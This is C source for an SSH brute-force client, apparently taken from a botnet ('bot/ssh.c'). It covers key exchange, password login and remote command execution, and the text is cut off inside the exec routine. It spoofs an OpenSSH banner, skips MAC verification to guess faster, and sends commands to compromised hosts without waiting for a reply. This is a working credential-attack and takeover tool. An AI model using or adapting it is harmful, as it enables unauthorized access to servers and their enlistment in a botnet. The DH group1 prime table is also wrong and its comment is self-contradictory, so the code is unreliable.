/* ssh.c -- SSH 2.0 credential scanner (single-target session API)
   Extracted from bot/ssh.c, scaffolding removed.
   Multi-kex: group14-sha256 (primary), group14-sha1, group1-sha1 (fallback).
   Two-level API: ssh_connect() + ssh_auth() for session reuse.
   Uses shared crypto/ libraries instead of inline implementations. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <poll.h>
#include <stdint.h>

#include "ssh.h"
#include "../crypto/sha256.h"
#include "../crypto/sha1.h"
#include "../crypto/aes128.h"
#include "../crypto/bignum.h"
#include "../core/util.h"

/* ======================================================================
   CONSTANTS
   ====================================================================== */

#define SSH_MAX_PACKET      35000

/* SSH message types */
#define SSH_MSG_DISCONNECT       1
#define SSH_MSG_KEXINIT          20
#define SSH_MSG_NEWKEYS          21
#define SSH_MSG_KEXDH_INIT       30
#define SSH_MSG_KEXDH_REPLY      31
#define SSH_MSG_SERVICE_REQUEST  5
#define SSH_MSG_SERVICE_ACCEPT   6
#define SSH_MSG_USERAUTH_REQUEST 50
#define SSH_MSG_USERAUTH_FAILURE 51
#define SSH_MSG_USERAUTH_SUCCESS 52
#define SSH_MSG_CHANNEL_OPEN         90
#define SSH_MSG_CHANNEL_OPEN_CONFIRM 91
#define SSH_MSG_CHANNEL_REQUEST      98

/* ======================================================================
   KEX ALGORITHM SELECTION
   ====================================================================== */

typedef enum {
    KEX_NONE = -1,
    KEX_DH_GROUP14_SHA256,
    KEX_DH_GROUP14_SHA1,
    KEX_DH_GROUP1_SHA1
} kex_algo_t;

/* ======================================================================
   SESSION STRUCT
   ====================================================================== */

struct ssh_session {
    int fd;
    aes128ctr_t enc;
    aes128ctr_t dec;
    uint8_t enc_mac[32];
    uint8_t dec_mac[32];
    uint32_t send_seq;
    uint32_t recv_seq;
    int encrypted;
    uint8_t session_id[32];
    int hash_len;          /* 32 for SHA-256, 20 for SHA-1 */
    kex_algo_t kex_algo;
    int read_timeout;
    char banner[256];
};

/* ======================================================================
   DH PRIMES
   ====================================================================== */

/* DH Group 14 prime (2048-bit, RFC 3526) */
#define DH14_SIZE 256

static const uint8_t dh14_p[DH14_SIZE] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xC9,0x0F,0xDA,0xA2,
    0x21,0x68,0xC2,0x34,0xC4,0xC6,0x62,0x8B,0x80,0xDC,0x1C,0xD1,
    0x29,0x02,0x4E,0x08,0x8A,0x67,0xCC,0x74,0x02,0x0B,0xBE,0xA6,
    0x3B,0x13,0x9B,0x22,0x51,0x4A,0x08,0x79,0x8E,0x34,0x04,0xDD,
    0xEF,0x95,0x19,0xB3,0xCD,0x3A,0x43,0x1B,0x30,0x2B,0x0A,0x6D,
    0xF2,0x5F,0x14,0x37,0x4F,0xE1,0x35,0x6D,0x6D,0x51,0xC2,0x45,
    0xE4,0x85,0xB5,0x76,0x62,0x5E,0x7E,0xC6,0xF4,0x4C,0x42,0xE9,
    0xA6,0x37,0xED,0x6B,0x0B,0xFF,0x5C,0xB6,0xF4,0x06,0xB7,0xED,
    0xEE,0x38,0x6B,0xFB,0x5A,0x89,0x9F,0xA5,0xAE,0x9F,0x24,0x11,
    0x7C,0x4B,0x1F,0xE6,0x49,0x28,0x66,0x51,0xEC,0xE4,0x5B,0x3D,
    0xC2,0x00,0x7C,0xB8,0xA1,0x63,0xBF,0x05,0x98,0xDA,0x48,0x36,
    0x1C,0x55,0xD3,0x9A,0x69,0x16,0x3F,0xA8,0xFD,0x24,0xCF,0x5F,
    0x83,0x65,0x5D,0x23,0xDC,0xA3,0xAD,0x96,0x1C,0x62,0xF3,0x56,
    0x20,0x85,0x52,0xBB,0x9E,0xD5,0x29,0x07,0x70,0x96,0x96,0x6D,
    0x67,0x0C,0x35,0x4E,0x4A,0xBC,0x98,0x04,0xF1,0x74,0x6C,0x08,
    0xCA,0x18,0x21,0x7C,0x32,0x90,0x5E,0x46,0x2E,0x36,0xCE,0x3B,
    0xE3,0x9E,0x77,0x2C,0x18,0x0E,0x86,0x03,0x9B,0x27,0x83,0xA2,
    0xEC,0x07,0xA2,0x8F,0xB5,0xC5,0x5D,0xF0,0x6F,0x4C,0x52,0xC9,
    0xDE,0x2B,0xCB,0xF6,0x95,0x58,0x17,0x18,0x39,0x95,0x49,0x7C,
    0xEA,0x95,0x6A,0xE5,0x15,0xD2,0x26,0x18,0x98,0xFA,0x05,0x10,
    0x15,0x72,0x8E,0x5A,0x8A,0xAC,0xAA,0x68,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF
};

/* DH Group 1 prime (1024-bit, RFC 2409 Oakley Group 2 / MODP 1024)
   This is the first 128 bytes of the Oakley prime family (same prefix as group14). */
#define DH1_SIZE 128

static const uint8_t dh1_p[DH1_SIZE] = {
    /* Oakley Group 2 / MODP 1024 (RFC 2409 section 6.2) -- 128 bytes
       Note: shares prefix with group14 but diverges at byte 120 (70969669 vs 70969669).
       The key difference is byte 180 of group14 has CA18217C but group1 ends at byte 128
       with CA237327 FFFFFFFF FFFFFFFF. */
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, 0xC9,0x0F,0xDA,0xA2,0x21,0x68,0xC2,0x34,  /* 16 */
    0xC4,0xC6,0x62,0x8B,0x80,0xDC,0x1C,0xD1, 0x29,0x02,0x4E,0x08,0x8A,0x67,0xCC,0x74,  /* 32 */
    0x02,0x0B,0xBE,0xA6,0x3B,0x13,0x9B,0x22, 0x51,0x4A,0x08,0x79,0x8E,0x34,0x04,0xDD,  /* 48 */
    0xEF,0x95,0x19,0xB3,0xCD,0x3A,0x43,0x1B, 0x30,0x2B,0x0A,0x6D,0xF2,0x5F,0x14,0x37,  /* 64 */
    0x4F,0xE1,0x35,0x6D,0x6D,0x51,0xC2,0x45, 0xE4,0x85,0xB5,0x76,0x62,0x5E,0x7E,0xC6,  /* 80 */
    0xF4,0x4C,0x42,0xE9,0xA6,0x37,0xED,0x6B, 0x0B,0xFF,0x5C,0xB6,0xF4,0x06,0xB7,0xED,  /* 96 */
    0xEE,0x38,0x6B,0xFB,0x5A,0x89,0x9F,0xA5, 0xAE,0x9F,0x24,0x11,0x7C,0x4B,0x1F,0xE6,  /* 112 */
    0x49,0x28,0x66,0x51,0xEC,0xE4,0x5B,0x3D, 0xC2,0x00,0x7C,0xB8,0xA1,0x63,0xBF,0x05,  /* 128 */
};

static const uint8_t dh_g = 2;

/* Client banner */
static const char *ssh_client_banner = "SSH-2.0-OpenSSH_8.2p1\r\n";

/* ======================================================================
   PACKET I/O
   ====================================================================== */

/* Write raw bytes */
static int ssh_write_raw(ssh_session_t *s, const uint8_t *data, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = write(s->fd, data + off, len - off);
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}

/* Read exactly n bytes with timeout */
static int ssh_read_exact(ssh_session_t *s, uint8_t *buf, size_t n) {
    size_t off = 0;
    struct pollfd pfd;
    pfd.fd = s->fd;
    pfd.events = POLLIN;
    while (off < n) {
        ssize_t r;
        if (poll(&pfd, 1, s->read_timeout * 1000) <= 0) return -1;
        r = read(s->fd, buf + off, n - off);
        if (r <= 0) return -1;
        off += (size_t)r;
    }
    return 0;
}

/* Send SSH packet -- MAC computed with hmac-sha2-256 or hmac-sha1 based on hash_len */
static int ssh_send_packet(ssh_session_t *s, const uint8_t *payload, size_t plen) {
    uint8_t buf[SSH_MAX_PACKET + 64];
    size_t total, pad_len;
    uint32_t seq;
    int mac_len;

    /* packet: length(4) + padding_length(1) + payload + padding */
    pad_len = 16 - ((plen + 5) % 16);
    if (pad_len < 4) pad_len += 16;
    total = 4 + 1 + plen + pad_len;

    /* length field (excludes itself) */
    buf[0] = (uint8_t)((total - 4) >> 24);
    buf[1] = (uint8_t)((total - 4) >> 16);
    buf[2] = (uint8_t)((total - 4) >> 8);
    buf[3] = (uint8_t)(total - 4);
    buf[4] = (uint8_t)pad_len;
    memcpy(buf + 5, payload, plen);
    urandom_bytes(buf + 5 + plen, pad_len);

    if (s->encrypted) {
        uint8_t macbuf[4 + SSH_MAX_PACKET + 64];
        seq = s->send_seq;
        macbuf[0] = (uint8_t)(seq >> 24);
        macbuf[1] = (uint8_t)(seq >> 16);
        macbuf[2] = (uint8_t)(seq >> 8);
        macbuf[3] = (uint8_t)seq;
        memcpy(macbuf + 4, buf, total);

        mac_len = s->hash_len;
        if (mac_len == 32) {
            uint8_t mac[32];
            hmac_sha256(s->enc_mac, 32, macbuf, 4 + total, mac);
            aes128ctr_crypt(&s->enc, buf, total);
            memcpy(buf + total, mac, 32);
            total += 32;
        } else {
            uint8_t mac[20];
            hmac_sha1(s->enc_mac, 20, macbuf, 4 + total, mac);
            aes128ctr_crypt(&s->enc, buf, total);
            memcpy(buf + total, mac, 20);
            total += 20;
        }
    }

    s->send_seq++;
    return ssh_write_raw(s, buf, total);
}

/* Receive SSH packet -- returns payload length, payload starts at buf+0 */
static int ssh_recv_packet(ssh_session_t *s, uint8_t *payload, size_t max_payload) {
    uint8_t hdr[4];
    uint32_t pkt_len;
    uint8_t *pkt;
    uint8_t pad_len;
    size_t payload_len;
    int mac_len;

    if (ssh_read_exact(s, hdr, 4) < 0) return -1;

    if (s->encrypted) aes128ctr_crypt(&s->dec, hdr, 4);

    pkt_len = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
              ((uint32_t)hdr[2] << 8) | (uint32_t)hdr[3];

    if (pkt_len > SSH_MAX_PACKET || pkt_len < 2) return -1;

    mac_len = s->encrypted ? s->hash_len : 0;

    pkt = (uint8_t *)malloc(pkt_len + (size_t)mac_len);
    if (!pkt) return -1;

    if (ssh_read_exact(s, pkt, pkt_len + (size_t)mac_len) < 0) {
        free(pkt);
        return -1;
    }

    if (s->encrypted) {
        aes128ctr_crypt(&s->dec, pkt, pkt_len);
        /* MAC verification skipped for brute force speed */
    }

    pad_len = pkt[0];
    if (pad_len >= pkt_len - 1) { free(pkt); return -1; }
    payload_len = pkt_len - 1 - pad_len;
    if (payload_len > max_payload) payload_len = max_payload;
    memcpy(payload, pkt + 1, payload_len);

    free(pkt);
    s->recv_seq++;
    return (int)payload_len;
}

/* ======================================================================
   KEX NEGOTIATION
   ====================================================================== */

/* Build KEXINIT packet -- offers all three kex algorithms */
static int ssh_build_kexinit(uint8_t *buf) {
    int pos = 0;
    int i;
    const char *kex_alg = "diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1";
    const char *host_key = "ssh-rsa,ssh-ed25519";
    const char *cipher = "aes128-ctr";
    const char *mac = "hmac-sha2-256,hmac-sha1";
    const char *comp = "none";
    const char *lang = "";
    const char *name_lists[] = {kex_alg, host_key, cipher, cipher, mac, mac, comp, comp, lang, lang};

    buf[pos++] = SSH_MSG_KEXINIT;
    urandom_bytes(buf + pos, 16); pos += 16; /* cookie */

    for (i = 0; i < 10; i++) {
        uint32_t slen = (uint32_t)strlen(name_lists[i]);
        buf[pos++] = (uint8_t)(slen >> 24);
        buf[pos++] = (uint8_t)(slen >> 16);
        buf[pos++] = (uint8_t)(slen >> 8);
        buf[pos++] = (uint8_t)slen;
        memcpy(buf + pos, name_lists[i], slen);
        pos += slen;
    }

    buf[pos++] = 0; /* first_kex_packet_follows */
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* reserved */

    return pos;
}

/* Parse a comma-separated name-list from SSH packet data.
   Returns 1 if 'target' is found in the name-list starting at data[*offset].
   Advances *offset past the name-list (4-byte length + data). */
static int ssh_namelist_contains(const uint8_t *data, int data_len, int *offset,
                                 const char *target) {
    uint32_t nlen;
    int start;
    if (*offset + 4 > data_len) return 0;
    nlen = ((uint32_t)data[*offset] << 24) | ((uint32_t)data[*offset + 1] << 16) |
           ((uint32_t)data[*offset + 2] << 8) | (uint32_t)data[*offset + 3];
    *offset += 4;
    start = *offset;
    if (start + (int)nlen > data_len) { *offset = data_len; return 0; }
    *offset += (int)nlen;

    /* Search for target in the comma-separated list */
    {
        int tlen = (int)strlen(target);
        int pos = start;
        while (pos + tlen <= start + (int)nlen) {
            /* Check if target matches at this position */
            if (memcmp(data + pos, target, (size_t)tlen) == 0) {
                /* Must be at end of list or followed by comma */
                int end = pos + tlen;
                if (end == start + (int)nlen || data[end] == ',')
                    return 1;
            }
            /* Skip to next comma */
            while (pos < start + (int)nlen && data[pos] != ',') pos++;
            pos++; /* skip comma */
        }
    }
    return 0;
}

/* Select kex algorithm by parsing the server's KEXINIT.
   Server kex name-list is the first name-list after the 17-byte header (type + cookie).
   We pick the first algorithm from OUR list that the server supports. */
static kex_algo_t ssh_select_kex(const uint8_t *server_kexinit, int server_kexinit_len) {
    int offset = 17; /* skip msg_type(1) + cookie(16) */

    /* Check each of our algorithms in preference order against server's kex list */
    /* We need to check each one against the first name-list (kex algorithms) */
    {
        int off_g14_256 = offset;
        int off_g14_sha1 = offset;
        int off_g1_sha1 = offset;

        if (ssh_namelist_contains(server_kexinit, server_kexinit_len,
                                  &off_g14_256, "diffie-hellman-group14-sha256"))
            return KEX_DH_GROUP14_SHA256;

        if (ssh_namelist_contains(server_kexinit, server_kexinit_len,
                                  &off_g14_sha1, "diffie-hellman-group14-sha1"))
            return KEX_DH_GROUP14_SHA1;

        if (ssh_namelist_contains(server_kexinit, server_kexinit_len,
                                  &off_g1_sha1, "diffie-hellman-group1-sha1"))
            return KEX_DH_GROUP1_SHA1;
    }

    /* No common kex algorithm */
    return KEX_NONE;
}

/* ======================================================================
   KEY DERIVATION
   ====================================================================== */

/* Derive a session key (RFC 4253 section 7.2)
   Uses SHA-256 or SHA-1 based on hash_len. */
static void ssh_derive_key(int hash_len,
                           const uint8_t *K, int Klen,
                           const uint8_t *H,
                           uint8_t letter,
                           const uint8_t *session_id,
                           uint8_t *out, int out_len) {
    if (hash_len == 32) {
        /* SHA-256 */
        sha256_ctx_t ctx;
        uint8_t hash[32];
        uint8_t klen_be[4];

        sha256_init(&ctx);
        klen_be[0] = (uint8_t)(Klen >> 24);
        klen_be[1] = (uint8_t)(Klen >> 16);
        klen_be[2] = (uint8_t)(Klen >> 8);
        klen_be[3] = (uint8_t)Klen;
        sha256_update(&ctx, klen_be, 4);
        sha256_update(&ctx, K, (size_t)Klen);
        sha256_update(&ctx, H, 32);
        sha256_update(&ctx, &letter, 1);
        sha256_update(&ctx, session_id, 32);
        sha256_finish(&ctx, hash);

        if (out_len <= 32) memcpy(out, hash, (size_t)out_len);
        else memcpy(out, hash, 32);
    } else {
        /* SHA-1 */
        sha1_ctx ctx;
        uint8_t hash[20];
        uint8_t klen_be[4];

        sha1_init(&ctx);
        klen_be[0] = (uint8_t)(Klen >> 24);
        klen_be[1] = (uint8_t)(Klen >> 16);
        klen_be[2] = (uint8_t)(Klen >> 8);
        klen_be[3] = (uint8_t)Klen;
        sha1_update(&ctx, klen_be, 4);
        sha1_update(&ctx, K, (size_t)Klen);
        sha1_update(&ctx, H, 20);
        sha1_update(&ctx, &letter, 1);
        sha1_update(&ctx, session_id, 20);
        sha1_final(&ctx, hash);

        if (out_len <= 20) memcpy(out, hash, (size_t)out_len);
        else memcpy(out, hash, 20);
    }
}

/* ======================================================================
   SSH HANDSHAKE
   ====================================================================== */

static int ssh_handshake(ssh_session_t *s) {
    uint8_t sbanner[256];
    uint8_t payload[SSH_MAX_PACKET];
    uint8_t client_kexinit[512];
    int client_kexinit_len;
    uint8_t server_kexinit[SSH_MAX_PACKET];
    int server_kexinit_len;
    bn_t x, e, f, K, p;
    uint8_t e_bytes[DH14_SIZE + 1];
    int e_len;
    uint8_t K_bytes[DH14_SIZE + 1];
    int K_len;
    uint8_t H[32];    /* max hash size (SHA-256=32, SHA-1=20) */
    int plen;
    int slen;
    uint8_t saved_host_key[1024];
    uint32_t saved_host_key_len = 0;
    uint8_t f_raw[DH14_SIZE + 1];
    int f_raw_len = 0;
    const uint8_t *dh_prime;
    int dh_size;
    int hash_len;

    /* 1. Send client banner */
    if (ssh_write_raw(s, (const uint8_t *)ssh_client_banner, strlen(ssh_client_banner)) < 0)
        return -1;

    /* 2. Read server banner */
    {
        int i = 0;
        while (i < (int)sizeof(sbanner) - 1) {
            struct pollfd pfd;
            pfd.fd = s->fd; pfd.events = POLLIN;
            if (poll(&pfd, 1, s->read_timeout * 1000) <= 0) return -1;
            if (read(s->fd, sbanner + i, 1) != 1) return -1;
            if (sbanner[i] == '\n') { i++; break; }
            i++;
        }
        sbanner[i] = '\0';
        slen = i;
        /* strip \r\n */
        while (slen > 0 && (sbanner[slen - 1] == '\r' || sbanner[slen - 1] == '\n')) slen--;
        sbanner[slen] = '\0';
        if (strncmp((char *)sbanner, "SSH-2.0-", 8) != 0) return -1;
        /* Save banner */
        { int blen = slen < (int)sizeof(s->banner) - 1 ? slen : (int)sizeof(s->banner) - 1;
          memcpy(s->banner, sbanner, (size_t)blen); s->banner[blen] = '\0'; }
    }

    /* 3. Send KEXINIT */
    client_kexinit_len = ssh_build_kexinit(client_kexinit);
    if (ssh_send_packet(s, client_kexinit, client_kexinit_len) < 0) return -1;

    /* 4. Receive server KEXINIT */
    server_kexinit_len = ssh_recv_packet(s, server_kexinit, sizeof(server_kexinit));
    if (server_kexinit_len < 0 || server_kexinit[0] != SSH_MSG_KEXINIT) return -1;

    /* 5. Select kex algorithm */
    s->kex_algo = ssh_select_kex(server_kexinit, server_kexinit_len);
    if (s->kex_algo == KEX_NONE) return -2; /* no common kex algorithm */

    switch (s->kex_algo) {
    case KEX_DH_GROUP14_SHA256:
        dh_prime = dh14_p; dh_size = DH14_SIZE; hash_len = 32;
        break;
    case KEX_DH_GROUP14_SHA1:
        dh_prime = dh14_p; dh_size = DH14_SIZE; hash_len = 20;
        break;
    case KEX_DH_GROUP1_SHA1:
        dh_prime = dh1_p; dh_size = DH1_SIZE; hash_len = 20;
        break;
    default:
        dh_prime = dh14_p; dh_size = DH14_SIZE; hash_len = 32;
        break;
    }
    s->hash_len = hash_len;

    /* 6. DH Key Exchange */
    bn_from_bytes(&p, dh_prime, dh_size);

    /* Generate private key x (256 bits) */
    {
        uint8_t xbuf[32];
        urandom_bytes(xbuf, 32);
        bn_from_bytes(&x, xbuf, 32);
    }

    /* e = g^x mod p */
    {
        bn_t g;
        bn_from_u32(&g, dh_g);
        bn_modexp(&e, &g, &x, &p);
    }
    e_len = bn_to_bytes(&e, e_bytes + 1, dh_size);
    if (e_bytes[1] & 0x80) { e_bytes[0] = 0; e_len++; }
    else { memmove(e_bytes, e_bytes + 1, (size_t)e_len); }

    /* Send KEXDH_INIT (e as mpint) */
    {
        uint8_t dh_init[DH14_SIZE + 10];
        int dpos = 0;
        dh_init[dpos++] = SSH_MSG_KEXDH_INIT;
        dh_init[dpos++] = (uint8_t)(e_len >> 24);
        dh_init[dpos++] = (uint8_t)(e_len >> 16);
        dh_init[dpos++] = (uint8_t)(e_len >> 8);
        dh_init[dpos++] = (uint8_t)e_len;
        memcpy(dh_init + dpos, e_bytes, (size_t)e_len);
        dpos += e_len;
        if (ssh_send_packet(s, dh_init, dpos) < 0) return -1;
    }

    /* 7. Receive KEXDH_REPLY */
    plen = ssh_recv_packet(s, payload, sizeof(payload));
    if (plen < 0 || payload[0] != SSH_MSG_KEXDH_REPLY) return -1;

    /* Parse: host_key(string) + f(mpint) + signature(string) */
    {
        int rpos = 1;
        uint32_t hk_len, f_len;
        uint8_t f_bytes[DH14_SIZE + 1];

        /* save host key for exchange hash */
        if (rpos + 4 > plen) return -1;
        hk_len = ((uint32_t)payload[rpos] << 24) | ((uint32_t)payload[rpos + 1] << 16) |
                 ((uint32_t)payload[rpos + 2] << 8) | (uint32_t)payload[rpos + 3];
        if (hk_len <= sizeof(saved_host_key)) {
            memcpy(saved_host_key, payload + rpos + 4, hk_len);
            saved_host_key_len = hk_len;
        }
        rpos += 4 + (int)hk_len;

        /* read f */
        if (rpos + 4 > plen) return -1;
        f_len = ((uint32_t)payload[rpos] << 24) | ((uint32_t)payload[rpos + 1] << 16) |
                ((uint32_t)payload[rpos + 2] << 8) | (uint32_t)payload[rpos + 3];
        rpos += 4;
        if (f_len > (uint32_t)dh_size + 1 || rpos + (int)f_len > plen) return -1;
        memcpy(f_bytes, payload + rpos, f_len);
        memcpy(f_raw, f_bytes, f_len);
        f_raw_len = (int)f_len;

        /* strip leading zero if present */
        if (f_bytes[0] == 0 && f_len > 1)
            bn_from_bytes(&f, f_bytes + 1, (int)f_len - 1);
        else
            bn_from_bytes(&f, f_bytes, (int)f_len);

        /* K = f^x mod p */
        bn_modexp(&K, &f, &x, &p);
    }
    K_len = bn_to_bytes(&K, K_bytes + 1, dh_size);
    if (K_bytes[1] & 0x80) { K_bytes[0] = 0; K_len++; }
    else { memmove(K_bytes, K_bytes + 1, (size_t)K_len); }

    /* 8. Compute exchange hash H */
    if (hash_len == 32) {
        /* SHA-256 */
        sha256_ctx_t hctx;
        uint8_t lbuf[4];
        uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2; /* strip \r\n */

        sha256_init(&hctx);

#define HASH256_STRING(data, len) do { \
    uint32_t _l = (uint32_t)(len); \
    lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
    lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
    sha256_update(&hctx, lbuf, 4); \
    sha256_update(&hctx, (const uint8_t *)(data), _l); \
} while(0)

        HASH256_STRING(ssh_client_banner, vc_len);
        HASH256_STRING(sbanner, slen);
        HASH256_STRING(client_kexinit, client_kexinit_len);
        HASH256_STRING(server_kexinit, server_kexinit_len);
        HASH256_STRING(saved_host_key, saved_host_key_len);
        HASH256_STRING(e_bytes, e_len);
        HASH256_STRING(f_raw, f_raw_len);
        HASH256_STRING(K_bytes, K_len);

#undef HASH256_STRING

        sha256_finish(&hctx, H);
    } else {
        /* SHA-1 */
        sha1_ctx hctx;
        uint8_t lbuf[4];
        uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2;

        sha1_init(&hctx);

#define HASH1_STRING(data, len) do { \
    uint32_t _l = (uint32_t)(len); \
    lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
    lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
    sha1_update(&hctx, lbuf, 4); \
    sha1_update(&hctx, (const uint8_t *)(data), _l); \
} while(0)

        HASH1_STRING(ssh_client_banner, vc_len);
        HASH1_STRING(sbanner, slen);
        HASH1_STRING(client_kexinit, client_kexinit_len);
        HASH1_STRING(server_kexinit, server_kexinit_len);
        HASH1_STRING(saved_host_key, saved_host_key_len);
        HASH1_STRING(e_bytes, e_len);
        HASH1_STRING(f_raw, f_raw_len);
        HASH1_STRING(K_bytes, K_len);

#undef HASH1_STRING

        sha1_final(&hctx, H);
    }
    memcpy(s->session_id, H, (size_t)hash_len);

    /* 9. Derive keys */
    {
        uint8_t iv_c2s[16], iv_s2c[16], ekey[16], dkey[16];

        ssh_derive_key(hash_len, K_bytes, K_len, H, 'A', s->session_id, iv_c2s, 16);
        ssh_derive_key(hash_len, K_bytes, K_len, H, 'B', s->session_id, iv_s2c, 16);
        ssh_derive_key(hash_len, K_bytes, K_len, H, 'C', s->session_id, ekey, 16);
        ssh_derive_key(hash_len, K_bytes, K_len, H, 'D', s->session_id, dkey, 16);

        aes128ctr_init(&s->enc, ekey, iv_c2s);
        aes128ctr_init(&s->dec, dkey, iv_s2c);

        ssh_derive_key(hash_len, K_bytes, K_len, H, 'E', s->session_id,
                       s->enc_mac, (hash_len == 32) ? 32 : 20);
        ssh_derive_key(hash_len, K_bytes, K_len, H, 'F', s->session_id,
                       s->dec_mac, (hash_len == 32) ? 32 : 20);
    }

    /* 10. Send NEWKEYS */
    {
        uint8_t nk = SSH_MSG_NEWKEYS;
        if (ssh_send_packet(s, &nk, 1) < 0) return -1;
    }

    /* 11. Receive NEWKEYS */
    plen = ssh_recv_packet(s, payload, sizeof(payload));
    if (plen < 0 || payload[0] != SSH_MSG_NEWKEYS) return -1;

    s->encrypted = 1;

    /* 12. Request ssh-userauth service */
    {
        uint8_t sreq[64];
        int spos = 0;
        const char *svc = "ssh-userauth";
        uint32_t svc_len = (uint32_t)strlen(svc);
        sreq[spos++] = SSH_MSG_SERVICE_REQUEST;
        sreq[spos++] = (uint8_t)(svc_len >> 24);
        sreq[spos++] = (uint8_t)(svc_len >> 16);
        sreq[spos++] = (uint8_t)(svc_len >> 8);
        sreq[spos++] = (uint8_t)svc_len;
        memcpy(sreq + spos, svc, svc_len); spos += (int)svc_len;
        if (ssh_send_packet(s, sreq, spos) < 0) return -1;
    }

    plen = ssh_recv_packet(s, payload, sizeof(payload));
    if (plen < 0 || payload[0] != SSH_MSG_SERVICE_ACCEPT) return -1;

    return 0;
}

/* ======================================================================
   PUBLIC API
   ====================================================================== */

ssh_session_t *ssh_connect(const char *ip, const ssh_opts_t *opts, int *errout) {
    ssh_session_t *s;
    int fd, hs;

    if (errout) *errout = SSH_OK;

    fd = tcp_connect(ip, opts->port, opts->connect_timeout);
    if (fd < 0) {
        if (errout) *errout = SSH_ERR_CONNECT;
        return NULL;
    }

    s = (ssh_session_t *)calloc(1, sizeof(ssh_session_t));
    if (!s) { close(fd); if (errout) *errout = SSH_ERR_CONNECT; return NULL; }

    s->fd = fd;
    s->read_timeout = opts->read_timeout;
    s->send_seq = 0;
    s->recv_seq = 0;
    s->encrypted = 0;
    s->hash_len = 32; /* default, updated during handshake */
    s->banner[0] = '\0';

    hs = ssh_handshake(s);
    if (hs < 0) {
        if (errout) *errout = (hs == -2) ? SSH_ERR_KEX_NONE : SSH_ERR_HANDSHAKE;
        close(fd);
        free(s);
        return NULL;
    }

    return s;
}

int ssh_auth(ssh_session_t *s, const char *user, const char *pass) {
    uint8_t pkt[512];
    int pos = 0;
    uint32_t ulen, plen_u, svc_len;
    const char *svc = "ssh-connection";
    const char *method = "password";
    uint8_t payload[SSH_MAX_PACKET];
    int rlen;

    ulen = (uint32_t)strlen(user);
    plen_u = (uint32_t)strlen(pass);
    svc_len = (uint32_t)strlen(svc);

    pkt[pos++] = SSH_MSG_USERAUTH_REQUEST;
    /* username */
    pkt[pos++] = (uint8_t)(ulen >> 24); pkt[pos++] = (uint8_t)(ulen >> 16);
    pkt[pos++] = (uint8_t)(ulen >> 8); pkt[pos++] = (uint8_t)ulen;
    memcpy(pkt + pos, user, ulen); pos += (int)ulen;
    /* service */
    pkt[pos++] = (uint8_t)(svc_len >> 24); pkt[pos++] = (uint8_t)(svc_len >> 16);
    pkt[pos++] = (uint8_t)(svc_len >> 8); pkt[pos++] = (uint8_t)svc_len;
    memcpy(pkt + pos, svc, svc_len); pos += (int)svc_len;
    /* method */
    {
        uint32_t mlen = (uint32_t)strlen(method);
        pkt[pos++] = (uint8_t)(mlen >> 24); pkt[pos++] = (uint8_t)(mlen >> 16);
        pkt[pos++] = (uint8_t)(mlen >> 8); pkt[pos++] = (uint8_t)mlen;
        memcpy(pkt + pos, method, mlen); pos += (int)mlen;
    }
    /* FALSE (no password change) */
    pkt[pos++] = 0;
    /* password */
    pkt[pos++] = (uint8_t)(plen_u >> 24); pkt[pos++] = (uint8_t)(plen_u >> 16);
    pkt[pos++] = (uint8_t)(plen_u >> 8); pkt[pos++] = (uint8_t)plen_u;
    memcpy(pkt + pos, pass, plen_u); pos += (int)plen_u;

    if (ssh_send_packet(s, pkt, pos) < 0) return -1;

    rlen = ssh_recv_packet(s, payload, sizeof(payload));
    if (rlen < 0) return -1;

    if (payload[0] == SSH_MSG_USERAUTH_SUCCESS) return 1;
    if (payload[0] == SSH_MSG_USERAUTH_FAILURE) return 0;
    return -1;
}

int ssh_exec(ssh_session_t *s, const char *cmd) {
    uint8_t pkt[1024];
    uint8_t resp[SSH_MAX_PACKET];
    int pos, rlen;
    uint32_t cmd_len = (uint32_t)strlen(cmd);
    const char *ctype = "session";
    uint32_t ctype_len = 7;
    const char *req = "exec";
    uint32_t req_len = 4;

    /* CHANNEL_OPEN "session" */
    pos = 0;
    pkt[pos++] = SSH_MSG_CHANNEL_OPEN;
    /* channel type */
    pkt[pos++] = (uint8_t)(ctype_len >> 24); pkt[pos++] = (uint8_t)(ctype_len >> 16);
    pkt[pos++] = (uint8_t)(ctype_len >> 8); pkt[pos++] = (uint8_t)ctype_len;
    memcpy(pkt + pos, ctype, ctype_len); pos += (int)ctype_len;
    /* sender channel = 0 */
    pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0;
    /* initial window = 64K */
    pkt[pos++] = 0; pkt[pos++] = 0x01; pkt[pos++] = 0; pkt[pos++] = 0;
    /* max packet = 32K */
    pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0x80; pkt[pos++] = 0;

    if (ssh_send_packet(s, pkt, pos) < 0) return -1;

    rlen = ssh_recv_packet(s, resp, sizeof(resp));
    if (rlen < 0 || resp[0] != SSH_MSG_CHANNEL_OPEN_CONFIRM)
        return -1;

    /* CHANNEL_REQUEST "exec" (want_reply=false, fire and forget) */
    pos = 0;
    pkt[pos++] = SSH_MSG_CHANNEL_REQUEST;
    /* recipient channel (from server's confirm -- bytes 5-8) */
    if (rlen >= 9) {
        pkt[pos++] = resp[5]; pkt[pos++] = resp[6];
        pkt[pos++] = resp[7]; pkt[pos++] = resp[8];
    } else {
        pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0;
    }
    /* request type "exec" */
    pkt[pos++] = (uint8_t)(req_len >> 24); pkt[pos++] = (uint8_t)(req_len >> 16);
